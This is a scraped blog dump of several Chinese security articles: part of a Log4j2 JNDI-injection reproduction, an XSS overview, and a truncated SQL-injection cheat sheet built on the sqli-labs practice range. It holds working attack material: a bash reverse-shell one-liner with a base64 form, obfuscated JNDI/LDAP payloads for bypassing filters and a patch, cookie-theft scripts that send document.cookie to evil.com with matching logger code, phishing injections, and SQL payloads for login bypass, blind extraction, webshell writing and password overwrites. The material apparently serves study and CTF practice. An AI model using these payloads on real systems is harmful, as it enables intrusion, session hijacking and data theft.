(org.apache.logging.log4j.core.config) log:481, LoggerConfig (org.apache.logging.log4j.core.config) log:456, LoggerConfig (org.apache.logging.log4j.core.config) log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config) log:161, Logger (org.apache.logging.log4j.core) tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi) logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi) logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi) logMessage:2017, AbstractLogger (org.apache.logging.log4j.spi) logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi) error:740, AbstractLogger (org.apache.logging.log4j.spi) main:18, main 日志记录/触发点 根据函数栈，这里是根据logger等级调用对应的方法\n我们通过LogManager.getLogger()来获取一个Logger对象，然后调用其debug/info/error/warn/fatal/trace/log 等方法记录日志等信息。这些方法，都会首先使用org.apache.logging.log4j.spi.AbstractLogger#logIfEnabled的若干个重载方法来根据当前配置记录日志等级，判断是否需要输出console和记录日志文件。\n在默认情况下，会输出 WARN/ERROR/FATAL 等级的日志。可以使用配置文件更改日志输出等级：\n1 2 3 4 5 6 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;Configuration\u0026gt; \u0026lt;Loggers\u0026gt; \u0026lt;Logger name=\u0026#34;org.su18\u0026#34; level=\u0026#34;All\u0026#34;/\u0026gt; \u0026lt;/Loggers\u0026gt; \u0026lt;/Configuration\u0026gt; 也可以使用如下代码来配置输出等级：\n1 2 3 4 5 LoggerContext ctx = (LoggerContext) LogManager.getContext(false); Configuration config = ctx.getConfiguration(); LoggerConfig loggerConfig = config.getLoggerConfig(LogManager.ROOT_LOGGER_NAME); loggerConfig.setLevel(Level.ALL); ctx.updateLoggers(); 本此漏洞的触发点，实际上是从 AbstractLogger#logMessage 方法开始的，凡是调用了此方法的 info/error/warn 等全部方法均可以作为本次漏洞的触发点，只是取决于配置的漏洞输出等级。\n可以看到AbstarctLooger实际上是实现了Logger提供的接口。\n消息格式化 这里是调用MessagePatternConverter里面的format方法来实现格式化。\nLog4j2 使用 org.apache.logging.log4j.core.pattern.MessagePatternConverter 来对日志消息进行处理，在实例化 MessagePatternConverter 时会从 Properties 及 Options 中获取配置来判断是否需要提供 Lookups 功能。\n1 2 3 4 5 6 7 8 9 10 11 12 public static final boolean FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS = PropertiesUtil.getProperties().getBooleanProperty(\u0026#34;log4j2.formatMsgNoLookups\u0026#34;, false); private MessagePatternConverter(final Configuration config, final String[] options) { super(\u0026#34;Message\u0026#34;, \u0026#34;message\u0026#34;); this.formats = options; this.config = config; int noLookupsIdx = this.loadNoLookups(options); this.noLookups = Constants.FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS || noLookupsIdx \u0026gt;= 0; this.textRenderer = this.loadMessageRenderer(noLookupsIdx \u0026gt;= 0 ? (String[])ArrayUtils.remove(options, noLookupsIdx) : options); } 可以看到在2.14.1版本的log4j2它默认的log4j2.formatMsgLookups配置值为false，因此Lookups功能默认是开启的。\n然后查看format方法，调用StrSubsitutor方法进行字符串替换\n字符串替换 Log4j2 提供 Lookup 功能的字符替换的关键处理类，位于org.apache.logging.log4j.core.lookup.StrSubstitutor，首先来看一下这个类。\n类中提供了关键的 DEFAULT_ESCAPE 是 $，DEFAULT_PREFIX 前缀是 ${，DEFAULT_SUFFIX 后缀是 }，DEFAULT_VALUE_DELIMITER_STRING 赋值分隔符是 :-，ESCAPE_DELIMITER_STRING 是 :\\-。\n然后通过StrSubstitutor初始化的构造器，将prefixMather、suffixMatcher、escapeChar进行赋值\n这个类提供了substitute方法，是整个Lookup功能的核心，用来递归替换相应的字符，这里看一下逻辑。\n通过while循环逐个字符寻找${前缀。\npos为当前字符串头指针，prefixMatcher.isMatch只负责匹配 ${ 两个字符。如果匹配到就进入第二层循环匹配，原理和代码相似。如果没有匹配到**}**字符，pos指针就正常+1。\n找到前缀后开始寻找后缀，但是在找后缀的while循环里面，又判断了是否替换变量中的值，如果替换，再匹配一次前缀，如果又找到了前缀，则continue跳出循环，再走一次找后缀的逻辑，用来满足变量中嵌套的过程。\n找后缀}的代码\n后续的处理中，通过多个 if/else 用来匹配 :- 和 :\\-。\n:- 是一个赋值关键字，如果程序处理到 ${aaaa:-bbbb} 这样的字符串，处理的结果将会是 bbbb，:- 关键字将会被截取掉，而之前的字符串都会被舍弃掉。 :\\- 是转义的 :-，如果一个用 a:b 表示的键值对的 key a 中包含 :，则需要使用转义来配合处理，例如 ${aaa:\\\\-bbb:-ccc}，代表 key 是，aaa:bbb，value 是 ccc。 在没有匹配到变量赋值或处理结束后，将会调用 resolveVariable 方法解析满足 Lookup 功能的语法，并执行相应的 lookup ，将返回的结果替换回原字符串后，再次调用 substitute 方法进行递归解析。\n继续截取${}中的内容，主要是为了判断是否还有${} 因此在字符串替换的过程中可以看到，方法提供了一些特殊的写法，并支持递归解析。而这些特性，将会可以用来进行绕过 WAF。\nresolveVariable 则调用 this.variableResolver#lookup 方法进行处理，而这实际上是一个代理类 Interpolator，这个类在接下来的内容进行说明\nLookup处理 由上面的函数栈调用，我们知道log4j2使用org.apache.logging.log4j.core.lookup.Interpolator 类来代理所有的 StrLookup 实现类。也就是说在实际使用 Lookup 功能时，由 Interpolator 这个类来处理和分发。\n这个类在初始化时创建了一个 strLookupMap ，将一些 lookup 功能关键字和处理类进行了映射，存放在这个 Map 中。\n默认是加入 log4j、sys、env、main、marker、java、lower、upper、jndi、jvmrunargs、spring、kubernetes、docker、web、date、ctx，由于部分功能的支持并不在 core 包中，所以如果加载不到对应的处理类，则会添加警告信息并跳过。而这些不同 Lookup 功能的支持，是随着版本更新的。\n处理和分发的关键逻辑在于其 lookup 方法，通过 : 作为分隔符来分隔 Lookup 关键字及参数，从strLookupMap 中根据关键字作为 key 匹配到对应的处理解析类，并调用其 lookup 方法。\n本次漏洞的触发方式是使用 jndi: 关键字来触发 JNDI 注入漏洞，对于 jndi: 关键字的处理类为 org.apache.logging.log4j.core.lookup.JndiLookup 。看一下最关键的 lookup 方法，可以看到是使用了 JndiManager 来支持 JNDI 的查询功能。\nJDNI查询 Log4j2 使用 org.apache.logging.log4j.core.net.JndiManager 来支持 JDNI 相关操作。\nJndiManager 使用私有内部类 JndiManagerFactory 来创建 JndiManager 实例，如下图：\n可以看到是创建了一个新的 InitialContext 实例，并作为参数传递用来创建 JndiManager，这个 Context 被保存在成员变量 context 中：\nJndiManager#lookup 方法则调用 this.context.lookup() 实现 JNDI 查询操作。\n最终造成JNDI注入\n0x05 漏洞利用 我们这里就采用简单的反弹shell拿到权限即可。\n1 2 3 4 反弹shell命令： bash -i \u0026gt;\u0026amp; /dev/tcp/127.0.0.1/8899 0\u0026gt;\u0026amp;1 base64加密： bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODg5OSAwPiYx}|{base64,-d}|{bash,-i} 0x06 绕过姿势 Rc1 绕过 rc1更新\n移除了从 Properties 中获取 Lookup 配置的选项，并修改判断逻辑，默认不开启 lookup 功能。 JndiManager#lookup 方法中添加了校验，使用了 JndiManagerFactory 来创建 JndiManager 实例，不再使用 InitialContext，而是使用子类 InitialDirContext，并为其添加白名单 JNDI 协议、白名单主机名、白名单类名。 漏洞点\n在关键的 lookup 函数中加入了校验判断，但是由于校验逻辑有误，程序在 catch 住异常后没有 return，导致可以利用 URISyntaxException 异常来绕过校验，直接走到后面的 lookup。 因此，只要在判断时触发 URISyntaxException 异常，例如在 URI 中插入空格，即可触发漏洞,payload如下:${jndi:ldap://127.0å.0.1:1389/ badClassName}不对空格做编码导致异常，但是lookup时候会去掉这个空格） RC2修复 RC2的修复方案是直接return，有效解决了上文的绕过\n1 2 3 4 5 6 try{ } catch (URISyntaxException ex) { LOGGER.warn(\u0026#34;Invalid JNDI URI - {}\u0026#34;, name); return null; } return (T) this.context.lookup(name); 多个${}执行流程 å\n先来分析一下多个${}的执行流程，Payload举例如下：\n${aaa:${bbb:ccc}dd}${ee:ff}\n当识别到多个${}时，准备来说是识别到多个${时，主要分为两种情况：\n当属于嵌套类型时，比如${${}}，参数nestedVarCount会执行+1操作，表示存在嵌套，防止找错闭合时用的}，会先处理内部的${}，再将处理结果返回后继续处理${} ；具体的原因，就是因为会递归调用substitute()`，所以会先把内部的处理完。\n当属于并列类型时，比如${}${}，会依次处理${}；因为他一次只会提取一整个${}。\n分隔符 org.apache.logging.log4j.core.lookup.StrSubstitutor#substitute()里处理完${}后，就会有一部分的分隔符处理，一个是valueEscapeDelimiterMatcher [:\\-]，另一个是valueDelimiterMatcher [:-]\n先来看第一个valueEscapeDelimiterMatcher，payload: ${aa:\\\\-bb}\n从下图可以看出来，就是给 :- 中的 \\ 去掉了变成了:-，\n再来看看valueDelimiterMatcher，payload ${aa:-bb}\n从下面可以看出来，被:-分割成了前后两部分，前面的部分赋值给varName，后面部分赋值给varDefaultValue；\nvarName会被传入到resolveVariable()进行解析，如果没有协议什么的，就会返回null 如果resolveVariable()返回值为null，varDefaultValue在后续的过程中也会递归调用substitute 最后会返回varDefaultValue的值\n一些绕过payload\n1 2 3 4 5 6 7 8 9 一些绕过paylioad ${${a:-j}ndi:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=} ${${a:-j}n${::-d}i:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=} ${${lower:jn}di:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=} ${${lower:${upper:jn}}di:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=} ${${lower:${upper:jn}}${::-di}:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=} 感觉主要是对jdni字段进行处理的绕过。 0x07 错误解决 Reference Class Name: foo 方法一 1 因为在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制11.0.1、8u191、7u201、6u211 com.sun.jndi.ldap.object.trustURLCodebase 默认为false 我们这里java版本为: 版本比较高，所以导致报错。\n所以这里需要加上一下代码：System.setProperty(\u0026quot;com.sun.jndi.ldap.object.trustURLCodebase\u0026quot;, \u0026quot;true\u0026quot;);即可复现成功\n方法二： 实际上限制了trustURLCodebase为Flase并不影响其执行系统命令，我们可以通过反弹shell拿到开启log4j2服务主机的权限。只需要指定命令:bash -i \u0026gt;\u0026amp; /dev/tcp/ip/port 0\u0026gt;\u0026amp;1即可。\n0x08 参考资料 https://cloud.tencent.com/developer/article/1987389\nhttps://www.cnblogs.com/hhhhhxian/p/16214263.html\nhttps://su18.org/post/log4j2/\nhttps://www.websecuritys.cn/index.php/archives/576/\nhttps://github.com/welk1n/JNDI-Injection-Exploit\nhttps://mp.weixin.qq.com/s/ZHcrraF2Agk8EEe-3_O18Q\n","permalink":"http://www.reus09.top/posts/tech/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/","summary":"0x00 前言 最近时间比较充沛，因此在这里复现一些流传比较广泛、危害性高的漏洞，Log4j2漏洞作为2021年爆出来的CVE明星，苦于当时时间紧迫，","title":"Log4j2漏洞复现及原理分析"},{"content":"主要对xss常见的分类、攻击手段。主要参考ctf-wiki-web-xss\nxss概念 跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在 WEB 应用程序中的计算机安全漏洞，是由于 WEB 应用程序对用户的输入过滤不足而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。\nxss分类 反射型XSS 反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。\n反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。\n服务器端代码：\n1 2 3 4 5 6 7 \u0026lt;?php // Is there any input? if( array_key_exists( \u0026#34;name\u0026#34;, $_GET ) \u0026amp;\u0026amp; $_GET[ \u0026#39;name\u0026#39; ] != NULL ) { // Feedback for end user echo \u0026#39;\u0026lt;pre\u0026gt;Hello \u0026#39; . $_GET[ \u0026#39;name\u0026#39; ] . \u0026#39;\u0026lt;/pre\u0026gt;\u0026#39;; } ?\u0026gt; 可以看到，代码直接引用了 name 参数，并没有做任何的过滤和检查，存在明显的 XSS 漏洞。\n持久型XSS 持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。\n此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?php if( isset( $_POST[ \u0026#39;btnSign\u0026#39; ] ) ) { // Get input $message = trim( $_POST[ \u0026#39;mtxMessage\u0026#39; ] ); $name = trim( $_POST[ \u0026#39;txtName\u0026#39; ] ); // Sanitize message input $message = stripslashes( $message ); $message = mysql_real_escape_string( $message ); // Sanitize name input $name = mysql_real_escape_string( $name ); // Update database $query = \u0026#34;INSERT INTO guestbook ( comment, name ) VALUES ( \u0026#39;$message\u0026#39;, \u0026#39;$name\u0026#39; );\u0026#34;; $result = mysql_query( $query ) or die( \u0026#39;\u0026lt;pre\u0026gt;\u0026#39; . mysql_error() . \u0026#39;\u0026lt;/pre\u0026gt;\u0026#39; ); //mysql_close(); } ?\u0026gt; 代码只对一些空白符、特殊符号、反斜杠进行了删除或转义，没有做 XSS 的过滤和检查，且存储在数据库中，明显存在存储型 XSS 漏洞。\nDOM型XSS 传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 Java\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;DOM-XSS test\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; var a=document.URL; document.write(a.substring(a.indexOf(\u0026#34;a=\u0026#34;)+2,a.length)); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 将代码保存在 domXSS.html 中，浏览器访问：\n1 http://127.0.0.1/domXSS.html?a=\u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/script\u0026gt; 即可触发 XSS 漏洞。\nXSS利用方式 Cookie窃取 攻击者可以使用以下代码获取客户端的 Cookies 信息：\n1 2 3 4 5 \u0026lt;script\u0026gt; document.location=\u0026#34;http://www.evil.com/cookie.asp?cookie=\u0026#34;+document.cookie new Image().src=\u0026#34;http://www.evil.com/cookie.asp?cookie=\u0026#34;+document.cookie \u0026lt;/script\u0026gt; \u0026lt;img src=\u0026#34;http://www.evil.com/cookie.asp?cookie=\u0026#34;+document.cookie\u0026gt;\u0026lt;/img\u0026gt; 在远程服务器，有一个接受和记录Cookies的文件：\n1 2 3 4 5 6 7 8 9 \u0026lt;% msg=Request.ServerVariables(\u0026#34;QUERY_STRING\u0026#34;) testfile=Server.MapPath(\u0026#34;cookie.txt\u0026#34;) set fs=server.CreateObject(\u0026#34;Scripting.filesystemobject\u0026#34;) set thisfile=fs.OpenTextFile(testfile,8,True,0) thisfile.Writeline(\u0026#34;\u0026#34;\u0026amp;msg\u0026amp; \u0026#34;\u0026#34;) thisfile.close set fs=nothing %\u0026gt; 1 2 3 4 5 6 \u0026lt;?php $cookie = $_GET[\u0026#39;cookie\u0026#39;]; $log = fopen(\u0026#34;cookie.txt\u0026#34;, \u0026#34;a\u0026#34;); fwrite($log, $cookie . \u0026#34;\\n\u0026#34;); fclose($log); ?\u0026gt; 攻击者在获取到 Cookies 之后，通过修改本机浏览器的 Cookies，即可登录受害者的账户。\n钓鱼 重定向钓鱼\n把当前页面重定向到一个钓鱼页面。\n1 http://www.bug.com/index.php?search=\u0026#34;\u0026#39;\u0026gt;\u0026lt;script\u0026gt;document.location.href=\u0026#34;http://www.evil.com\u0026#34;\u0026lt;/script\u0026gt; HTML 注入式钓鱼\n使用 XSS 漏洞注入 HTML 或 JavaScript 代码到页面中。\n1 http://www.bug.com/index.php?search=\u0026#34;\u0026#39;\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;login\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt; 该段代码会在正常页面中嵌入一个 Form 表单。\niframe 钓鱼\n这种方式是通过 \u0026lt;iframe\u0026gt; 标签嵌入远程域的一个页面实施钓鱼。\n1 http://www.bug.com/index.php?search=\u0026#39;\u0026gt;\u0026lt;iframe src=\u0026#34;http://www.evil.com\u0026#34; height=\u0026#34;100%\u0026#34; width=\u0026#34;100%\u0026#34;\u0026lt;/iframe\u0026gt; Flash 钓鱼\n将构造好的 Flash 文件传入服务器，在目标网站用 \u0026lt;object\u0026gt; 或 \u0026lt;embed\u0026gt; 标签引用即可。\n高级钓鱼技术\n注入代码劫持 HTML 表单、使用 JavaScript 编写键盘记录器等。\n网页挂马 一般都是通过篡改网页的方式来实现的，如在 XSS 中使用 \u0026lt;iframe\u0026gt; 标签。\nDOS 与 DDOS 注入恶意 JavaScript 代码，可能会引起一些拒绝服务攻击。\nXSS 蠕虫 通过精心构造的 XSS 代码，可以实现非法转账、篡改信息、删除文章、自我复制等诸多功能。\n","permalink":"http://www.reus09.top/posts/tech/xss/","summary":"主要对xss常见的分类、攻击手段。主要参考ctf-wiki-web-xss xss概念 跨站脚本（Cross-Site Scripting，XSS","title":"Xss"},{"content":"这篇文章主要想对web注入的方式进行一个梳理总结，主要通过靶场sqli-labs进行。\n[TOC]\n万能密码 1 2 3 4 5 6 7 8 9 admin\u0026#39; -- admin\u0026#39; # admin\u0026#39;/\\* \u0026#39; or 1=1-- \u0026#39; or 1=1# \u0026#39; or 1=1/* \u0026#39;) or \u0026#39;1\u0026#39;=\u0026#39;1-- \u0026#39;) or (\u0026#39;1\u0026#39;=\u0026#39;1-- 1\u0026#39;^1# (False注入) 常见的是对 \u0026rsquo; , \u0026quot; , ),还有一些内置函数的绕过 联合查询 查库名-\u0026gt;查表名-\u0026gt;查列名（字段名）-\u0026gt;查值（数据）\n根据字段数量查：order by 4 --+\n根据页面回显数据字段位置:union select 1,2,3,4,x... --+\n爆数据库：\n1 2 3 4 5 select database() select schema_name from information_schema.schemata; -- MySQL8新特性(\u0026gt;8.0.21) table information_schema.TABLESPACES_EXTENSIONS 根据上面得到的数据库进行爆对应的表:\n1 union select 1,2,group_concat(table_name),4,xxxx from information_schema.tables where table_schema=database() union查询:\n1 2 3 4 5 UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database(); /* 列出所有用户自定义数据库中的表 */ -- MySQL 4版本时用version=9，MySQL 5版本时用version=10 UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10; /* 列出当前数据库中的表 */ SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema!=\u0026#39;information_schema\u0026#39; AND table_schema!=\u0026#39;mysql\u0026#39;; 盲注:\n1 2 3 4 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables \u0026gt; \u0026#39;A\u0026#39; -- MySQL8新特性 and (table information_schema.TABLESPACES_EXTENSIONS limit 1,1)\u0026gt;(BINARY(\u0026#39;a\u0026#39;),\u0026#39;0\u0026#39;)# 主要是通过布尔盲注，一个个试，比较废时间,可以通过编写脚本 时间盲注，根据时间判断成功与否也可以 报错：\n1 2 AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1))); -- 在5.1.5版本中成功。 主要是利用floor函数的溢出问题， 通过contractxml函数等进行报错也可以实现contract(0x7e,database()) 根据对应的表获取对应的列名：\n1 Union select 1,2,group_concat(column_name),4,xxxx from information_schema.columns where table_schema=database() and table_name=(table_name) /*此处的表名为字符串型，也通过十六进制表示*/ union查询\n1 UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = \u0026#39;tablename\u0026#39; 盲注\n1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns \u0026gt; \u0026#39;A\u0026#39; 报错\n1 2 3 4 -- 在5.1.5版本中成功 AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1) -- MySQL 5.1版本修复了 AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELE 值查询\n1 2 3 4 Union select 1,2,column_name,4,xxx from (database_name.)table_name -- MySQL8新特性 and (table flag limit 1,1)\u0026gt;(BINARY(\u0026#39;a\u0026#39;))# 盲注 基于报错盲注 通过特殊函数的错误使用使其参数被页面输出。\n前提：服务器开启报错信息返回，也就是发生错误时返回报错信息。\n比如(sqli.error()) 常见的利用函数有：exp()、floor()+rand()、updatexml()、extractvalue()等。\n1 2 3 4 5 6 (where|and|or) exp(~(select * from(select user())a)); (where|and|or) pow(~(select * from(select user())a),9999); (where|and|or) updatexml(1,concat(0x7e,(select user()),0x7e),1); (where|and|or) extractvalue(1,concat(0x7e,(select user()),0x7e)); (where|and|or) (select count(*) from information_schema.tables group by concat((select user()),0x7e,floor(rand(0)*2))); (where|and|or) (select count(*) from information_schema.tables group by concat((select user()),0x7e,ceil(rand(0)*2))); 基于时间盲注 依赖于通过页面返回的延迟时间来判断条件是否正确。\n通常可利用的产生时间延迟的函数有：sleep()、benchmark()，还有许多进行复杂运算的函数也可以当做延迟的判断标准、笛卡尔积合并数据表、GET_LOCK双SESSION产生延迟等方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 -- sleep() (where | and) if(substr((select password from users where username=\u0026#39;admin\u0026#39;),1,1)=\u0026#39;a\u0026#39;,sleep(3),1) select * from users where username=$username (and | or) if(length(database())\u0026gt;8,sleep(3),1) -- benchmark() or benchmark(5000000,md5(\u0026#39;test\u0026#39;)) or if(length(database())\u0026gt;5,benchmark(1500000,md5(\u0026#39;test\u0026#39;)),1) -- pg_sleep() (and | or) (case when (select substr(password,1,1) from users)=\u0026#39;a\u0026#39; then pg_sleep(5) else pg_sleep(0) end) and (select case when(substr((select password from users where username=\u0026#39;admin\u0026#39;),1,1)=\u0026#39;a\u0026#39;) then (select \u0026#39;roarctf\u0026#39; from pg_sleep(3)) else \u0026#39;1\u0026#39; end)=\u0026#39;roarctf\u0026#39; -- 笛卡尔积 heavy query select * from users where id=1 and 1\u0026gt;(select count(*) from information_schema.columns A, information_schema.columns B, information_schema.columns C); select * from users where id=1 and if(1,concat(rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;),rpad(1,999999,\u0026#39;a\u0026#39;)) RLIKE \u0026#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b\u0026#39;,0) and \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;; 基于布尔盲注 使用场景：对真/假条件返回的内容很容易区分。\n1 2 3 4 5 6 7 (where | and) if(substr((select password from users where username=\u0026#39;admin\u0026#39;),1,1)=\u0026#39;a\u0026#39;,1,0) select * from users where username=nouser or length(database())\u0026gt;8 select * from users where username=nouser or ascii(substr(database(),1,1))\u0026lt;130 -- 通配符 select * from users where username=\u0026#39;xxx\u0026#39; and passwd=\u0026#39;-1\u0026#39; or passwd like \u0026#39;{}%\u0026#39;# 基于sql增删改查的盲注 update注入 1 2 3 4 5 #盲注 update users set username = \u0026#39;0\u0026#39;|if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1) where id=15; update users set username = \u0026#39;0\u0026#39; | (substr(user(),1,1) regexp 0x5e5b6d2d7a5d) where id=14; insert注入 1 2 3 4 #盲注 insert into users values (16,\u0026#39;K0rz3n\u0026#39;,\u0026#39;0\u0026#39;| if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1)); insert into users values (15,\u0026#39;K0rz3n\u0026#39;,\u0026#39;0\u0026#39;| (substr(user(),1,1) regexp 0x5e5b6d2d7a5d)); order by 注入 1 2 3 4 5 #报错注入 select * from users order by updatexml(1,concat(0x7e,(select%20user()),0x7e),1); #盲注 select * from users order by id ^(select(select version()) regexp \u0026#39;^5\u0026#39;); Group by 注入 1 2 #盲注 select * from users group by 1 having substr((select database()),1,1)=\u0026#39;c\u0026#39; 文件写入 我们可以通过sql语句实现写入webshell，从而可以远程通过菜刀、冰蝎等工具建立连接。 当然，文件写入的条件比较特殊 数据库当前用户为root权限； 知道当前网站的绝对路径； PHP的GPC为 off状态；(魔术引号，GET，POST，Cookie) 写入的那个路径存在写入权限。 基于联合查询 1 2 3 SELECT 1,\u0026#39;\u0026lt;?php phpinfo();?\u0026gt;\u0026#39;,3 into outfile \u0026#39;C:\\info.php\u0026#39;%23 ?id=1 UNION ALL SELECT 1,\u0026#39;\u0026lt;?php phpinfo();?\u0026gt;\u0026#39;,3 into dumpfile \u0026#39;C:\\info.php\u0026#39;%23 非联合查询 当我们无法使用联合查询时，我们可以使用fields terminated by与lines terminated by来写shell：?id=1 into outfile 'C:\\info.php' FIELDS TERMINATED BY '\u0026lt;?php phpinfo();?\u0026gt;'%23\n宽字节注入 国内最常使用的 GBK 编码，这种方式主要是绕过 addslashes 等对特殊字符进行转移的绕过。反斜杠 \\ 的十六进制为 %5c，在你输入 %bf%27 时，函数遇到单引号自动转移加入 \\，此时变为 %bf%5c%27，%bf%5c 在 GBK 中变为一个宽字符「縗」。%bf 那个位置可以是 %81-%fe 中间的任何字符。不止在 SQL 注入中，宽字符注入在很多地方都可以应用。\nGET方式：利用URLencode ?id=1%df'||1={payload}%23\nPOST方式：利用UTF-16或UTF-32或中文 ?id=1我'||1={payload}#\n堆叠注入 由于分号;为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法执行其他恶意语句，如RENAME、DROP等。\n1 2 3 4 5 6 7 8 9 10 11 12 13 1;show databases;# 1;show tables;# 1;show columns from [表名];# 1;update`ctfshow_user`set`pass`=(0x31323334)where(username=0x61646d696e) /*预处理*/ 1;PREPARE hacker from char(117,112,100,97,116,101,96,99,116,102,115,104,111,119,95,117,115,101,114,96,115,101,116,96,112,97,115,115,96,61,40,48,120,51,49,51,50,51,51,51,52,41,119,104,101,114,101,40,117,115,101,114,110,97,109,101,61,48,120,54,49,54,52,54,100,54,57,54,101,41);EXECUTE hacker;# 1;PREPARE hacker from 0x7570646174656063746673686f775f75736572607365746070617373603d283078333133323333333429776865726528757365726e616d653d30783631363436643639366529;EXECUTE hacker;# 1\u0026#39;;SET @sqli=char(117,112,100,97,116,101,96,99,116,102,115,104,111,119,95,117,115,101,114,96,115,101,116,96,112,97,115,115,96,61,40,48,120,51,49,51,50,51,51,51,52,41,119,104,101,114,101,40,117,115,101,114,110,97,109,101,61,48,120,54,49,54,52,54,100,54,57,54,101,41);PREPARE hacker from @sqli;EXECUTE hacker;# 1\u0026#39;;SET @sqli=0x7570646174656063746673686f775f75736572607365746070617373603d283078333133323333333429776865726528757365726e616d653d30783631363436643639366529;PREPARE hacker from @sqli;EXECUTE hacker;# 二次注入 攻击者构造的恶意数据存储到数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。\n1 2 3 4 5 现在通常Web应用程序大多都会进行参数过滤，来防止注入。如果某处使用了urldecode()或者 rawurldecode()函数，则会导致二次解码生成单引号二引发注入，即二次注入。 Web应用程序通常使用addslashes() 、mysql_real_escape_string()、mysql_escape_string()函数或者开启GPC来防止注入，也就是给单引号(‘’)、双引号(“”)、反斜杠()和NULL加上反斜杠转义。 addslashes函数虽然在过滤之后会添加 “\\” 进行转义，但是 “\\” 